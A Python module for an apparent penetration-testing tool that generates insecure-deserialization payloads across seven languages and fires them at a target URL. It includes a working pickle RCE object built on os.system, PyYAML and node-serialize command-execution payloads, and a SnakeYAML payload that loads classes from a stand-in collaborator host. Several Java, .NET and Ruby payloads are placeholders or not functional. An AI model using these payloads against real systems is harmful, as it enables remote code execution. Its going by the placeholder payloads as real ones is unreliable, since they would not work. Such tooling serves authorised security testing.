"""Deserialization Payload Tool Integration for Sentinel-X

Provides payload generation and testing for insecure deserialization vulnerabilities.

Features:
- PHP deserialization payloads
- Java deserialization (ysoserial-style) payloads
- Python pickle deserialization payloads
- Ruby deserialization payloads
- .NET deserialization payloads (ViewState, BinaryFormatter)
- Node.js deserialization payloads
- YAML deserialization payloads (SnakeYAML)
- Payload encoding (Base64, gzip, hex)
"""

import base64
import zlib
from dataclasses import asdict, dataclass
from datetime import datetime
from typing import Any
from urllib.parse import quote


@dataclass
class DeserializationResult:
    """Structured deserialization scan result"""
    target: str
    language: str
    vulnerability_detected: bool
    findings: list[dict[str, Any]]
    payloads_generated: int
    payloads_tested: dict[str, Any]
    execution_time_seconds: float
    tool_version: str
    raw_responses: list[dict[str, Any]]
    errors: list[str]

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


# ============================================================================
# PAYLOAD GENERATORS
# ============================================================================

def _php_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate PHP deserialization payloads"""
    payloads = []

    # Simple PHP object injection
    payloads.append({
        "name": "php_object_injection_cmd",
        "payload": f'O:10:"ExampleClass":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}',
        "encoding": "plain",
        "description": "PHP object injection with command execution via __destruct",
    })

    # PHP session serialization
    payloads.append({
        "name": "php_session_serialization",
        "payload": f'user|s:{len(command)}:"{command}";',
        "encoding": "plain",
        "description": "PHP session serialization injection",
    })

    # PHP native serialization with magic methods
    payloads.append({
        "name": "php_native_serialization",
        "payload": f'a:1:{{i:0;O:16:"VulnerableClass":1:{{s:4:"exec";s:{len(command)}:"{command}";}}}}',
        "encoding": "plain",
        "description": "PHP native serialization with __wakeup/__destruct",
    })

    # Base64 encoded PHP serialization
    b64 = base64.b64encode(payloads[0]["payload"].encode()).decode()
    payloads.append({
        "name": "php_b64_object_injection",
        "payload": b64,
        "encoding": "base64",
        "description": "Base64-encoded PHP serialized object",
    })

    return payloads


def _java_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate Java deserialization payloads (ysoserial-style)"""
    payloads = []

    # Common ysoserial gadget chains (simulated - real payloads need ysoserial binary)
    gadget_chains = [
        "CommonsCollections1",
        "CommonsCollections2",
        "CommonsCollections4",
        "CommonsBeanutils1",
        "Jdk7u21",
        "JRMPClient",
        "URLDNS",
    ]

    for chain in gadget_chains:
        payloads.append({
            "name": f"java_ysoserial_{chain}",
            "payload": "rO0ABXQAKXt5c29zZXJpYWwve2NoYWlufS9jb21tYW5kOntjb21tYW5kfQ==",
            "encoding": "base64_java",
            "gadget_chain": chain,
            "description": f"Java ysoserial {chain} gadget chain (simulated - install ysoserial for real payloads)",
        })

    # Java binary serialization header (AC ED 00 05)
    payloads.append({
        "name": "java_serialization_header",
        "payload": "rO0ABXQ=",
        "encoding": "base64",
        "description": "Java serialization magic bytes (AC ED 00 05) - used for detection",
    })

    return payloads


def _python_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate Python pickle deserialization payloads"""
    payloads = []

    # Pickle RCE payload
    import os as _os
    import pickle as _pickle

    class _RCE:
        def __reduce__(self):
            return (_os.system, (command,))

    rce_payload = base64.b64encode(_pickle.dumps(_RCE())).decode()
    payloads.append({
        "name": "python_pickle_rce",
        "payload": rce_payload,
        "encoding": "base64",
        "command": command,
        "description": "Python pickle RCE via __reduce__",
    })

    # Yaml deserialization
    payloads.append({
        "name": "python_yaml_rce",
        "payload": f"!!python/object/apply:os.system [{command}]",
        "encoding": "plain",
        "description": "PyYAML deserialization RCE via !!python/object/apply",
    })

    # JSON pickle (safe)
    payloads.append({
        "name": "pickle_detection",
        "payload": base64.b64encode(b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.").decode(),
        "encoding": "base64",
        "description": "Pickle protocol 4 magic bytes (detection payload)",
    })

    return payloads


def _dotnet_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate .NET deserialization payloads"""
    payloads = []

    # ViewState
    payloads.append({
        "name": "dotnet_viewstate_parameter",
        "payload": "__VIEWSTATE=/wE...",  # Truncated - needs tool generation
        "encoding": "url",
        "description": "ASP.NET ViewState parameter - use ViewState tooling for full payloads",
    })

    # BinaryFormatter
    payloads.append({
        "name": "dotnet_binary_formatter",
        "payload": "AAEAAAD/////AQAAAAAAAAA...",
        "encoding": "base64",
        "description": ".NET BinaryFormatter serialization payload (simulated)",
    })

    # SoapFormatter
    payloads.append({
        "name": "dotnet_soap_formatter",
        "payload": '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">'
                   '<SOAP-ENV:Body>'
                   '<__LastError SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
                   '<_message xsi:type="xsd:string">test</_message>'
                   '</__LastError>'
                   '</SOAP-ENV:Body>'
                   '</SOAP-ENV:Envelope>',
        "encoding": "xml",
        "description": ".NET SoapFormatter deserialization",
    })

    return payloads


def _ruby_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate Ruby deserialization payloads"""
    payloads = []

    payloads.append({
        "name": "ruby_marshal_dump",
        "payload": base64.b64encode(
            b"\x04\x08" +  # Ruby marshal header
            b"o:\x0cVulnerable\x00"  # Object type
        ).decode(),
        "encoding": "base64",
        "description": "Ruby Marshal.dump deserialization payload",
    })

    payloads.append({
        "name": "ruby_yaml_rce",
        "payload": "--- !ruby/object:ERB\ntemplate: id\n",
        "encoding": "plain",
        "description": "Ruby YAML deserialization RCE via ERB template",
    })

    return payloads


def _nodejs_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate Node.js deserialization payloads"""
    payloads = []

    payloads.append({
        "name": "nodejs_serialize_rce",
        "payload": base64.b64encode(
            b'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'' +
            command.encode() +
            b'\',function(){})()}()"}'
        ).decode(),
        "encoding": "base64",
        "description": "node-serialize RCE via IIFE function",
    })

    # Express session deserialization
    payloads.append({
        "name": "nodejs_express_session",
        "payload": base64.b64encode(
            b'{"cookie":{"originalMaxAge":null},"__proto__":{"admin":true}}'
        ).decode(),
        "encoding": "base64",
        "description": "Node.js Express session deserialization with prototype pollution",
    })

    return payloads


def _yaml_payloads(command: str = "id") -> list[dict[str, Any]]:
    """Generate YAML deserialization payloads"""
    payloads = []

    payloads.append({
        "name": "snakeyaml_rce",
        "payload": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLABORATOR/?\"]]]]",
        "encoding": "plain",
        "description": "SnakeYAML deserialization RCE via ScriptEngineManager",
    })

    return payloads


# ============================================================================
# PAYLOAD GENERATOR REGISTRY
# ============================================================================

PAYLOAD_GENERATORS = {
    "php": _php_payloads,
    "java": _java_payloads,
    "python": _python_payloads,
    "dotnet": _dotnet_payloads,
    "ruby": _ruby_payloads,
    "nodejs": _nodejs_payloads,
    "yaml": _yaml_payloads,
}

LANGUAGES = ["php", "java", "python", "dotnet", "ruby", "nodejs", "yaml"]


class DeserializationTool:
    """Insecure Deserialization testing tool for Sentinel-X"""

    def __init__(self):
        self.name = "deserialization_tool"
        self.supported_languages = LANGUAGES
        self.version_cache: str | None = "1.0.0"

    def is_available(self) -> bool:
        """Deserialization tool is always available (payload-based generators)"""
        return True

    def get_version(self) -> str:
        return self.version_cache or "1.0.0"

    def generate_payloads(
        self,
        language: str = "all",
        command: str = "id",
    ) -> dict[str, list[dict[str, Any]]]:
        """
        Generate deserialization payloads for testing.

        Args:
            language: Target language/framework ("all", "php", "java", "python", etc.)
            command: Command to execute in RCE payloads

        Returns:
            Dictionary of language -> list of payload dicts
        """
        result = {}
        if language == "all":
            for lang, generator in PAYLOAD_GENERATORS.items():
                result[lang] = generator(command)
        elif language in PAYLOAD_GENERATORS:
            result[language] = PAYLOAD_GENERATORS[language](command)
        return result

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode a payload for various transport formats"""
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            return quote(payload)
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "gzip_base64":
            compressed = zlib.compress(payload.encode())
            return base64.b64encode(compressed).decode()
        return payload

    async def scan(
        self,
        target: str,
        language: str = "all",
        command: str = "id",
        method: str = "POST",
        headers: dict[str, str] | None = None,
        cookie: str | None = None,
        timeout_sec: int = 30,
    ) -> DeserializationResult:
        """
        Test a target for insecure deserialization vulnerabilities.

        Sends generated payloads to the target and analyzes responses.

        Args:
            target: Target URL
            language: Language/framework to test
            command: Command for RCE payloads (safe default: "id")
            method: HTTP method
            headers: Custom headers
            cookie: Session cookie
            timeout_sec: Request timeout
        """
        errors = []
        findings = []
        raw_responses = []
        start_time = datetime.now()
        vuln_detected = False
        payloads_tested: dict[str, Any] = {}

        if not headers:
            headers = {}

        # Generate payloads
        payload_sets = self.generate_payloads(language, command)
        total_payloads = sum(len(plist) for plist in payload_sets.values())

        try:
            import httpx
            async with httpx.AsyncClient(timeout=timeout_sec, verify=False) as client:
                for lang, payloads in payload_sets.items():
                    lang_results = []
                    for p in payloads:
                        test_payload = p["payload"]

                        # Encode if needed
                        if p["encoding"] == "url":
                            test_payload = quote(test_payload)

                        try:
                            resp = await client.request(
                                method=method.upper(),
                                url=target,
                                content=test_payload,
                                headers=headers,
                                cookies={"Cookie": cookie} if cookie else None,
                            )

                            response_data = {
                                "language": lang,
                                "payload_name": p["name"],
                                "status_code": resp.status_code,
                                "body_length": len(resp.text),
                                "body_preview": resp.text[:300],
                            }
                            raw_responses.append(response_data)

                            # Detect indicators
                            body = resp.text.lower()
                            if "uid=" in body or "gid=" in body or command in body:
                                vuln_detected = True
                                findings.append({
                                    "type": "deserialization_rce",
                                    "language": lang,
                                    "payload": p["name"],
                                    "evidence": resp.text[:300],
                                    "confidence": "high",
                                })

                            if "traceback" in body or "stack trace" in body or "system." in body.lower():
                                vuln_detected = True
                                findings.append({
                                    "type": "deserialization_error",
                                    "language": lang,
                                    "payload": p["name"],
                                    "evidence": resp.text[:200],
                                    "confidence": "medium",
                                })

                            if resp.status_code == 500:
                                findings.append({
                                    "type": "deserialization_500",
                                    "language": lang,
                                    "payload": p["name"],
                                    "confidence": "low",
                                })

                            lang_results.append({
                                "name": p["name"],
                                "status": "sent",
                                "status_code": resp.status_code,
                            })

                        except Exception as e:
                            lang_results.append({
                                "name": p["name"],
                                "status": "error",
                                "error": str(e)[:100],
                            })

                    payloads_tested[lang] = lang_results

        except Exception as e:
            errors.append(str(e)[:200])

        execution_time = (datetime.now() - start_time).total_seconds()

        return DeserializationResult(
            target=target,
            language=language,
            vulnerability_detected=vuln_detected,
            findings=findings,
            payloads_generated=total_payloads,
            payloads_tested=payloads_tested,
            execution_time_seconds=execution_time,
            tool_version=self.get_version(),
            raw_responses=raw_responses[:50],
            errors=errors
        )

    def get_capabilities(self) -> dict[str, Any]:
        """Return tool capabilities for tool discovery"""
        return {
            'name': self.name,
            'version': self.get_version(),
            'available': self.is_available(),
            'supported_languages': self.supported_languages,
            'features': [
                'php_deserialization',
                'java_deserialization',
                'python_pickle',
                'dotnet_deserialization',
                'ruby_marshal',
                'nodejs_deserialization',
                'yaml_deserialization',
                'payload_encoding',
                'payload_generation',
            ],
            'parameters': {
                'target': {'required': True, 'description': 'Target URL'},
                'language': {'required': False, 'default': 'all', 'options': self.supported_languages, 'description': 'Target language'},
                'command': {'required': False, 'default': 'id', 'description': 'Command for RCE payloads'},
                'method': {'required': False, 'default': 'POST', 'description': 'HTTP method'},
            },
            'owasp_mapping': {
                'A08': 'Software and Data Integrity Failures - insecure deserialization',
                'A05': 'Security Misconfiguration - unsafe deserialization configurations',
            }
        }


# Global instance for tool registry
_deserialization_tool: DeserializationTool | None = None


def get_deserialization_tool() -> DeserializationTool:
    """Get or create global deserialization tool instance"""
    global _deserialization_tool
    if _deserialization_tool is None:
        _deserialization_tool = DeserializationTool()
    return _deserialization_tool
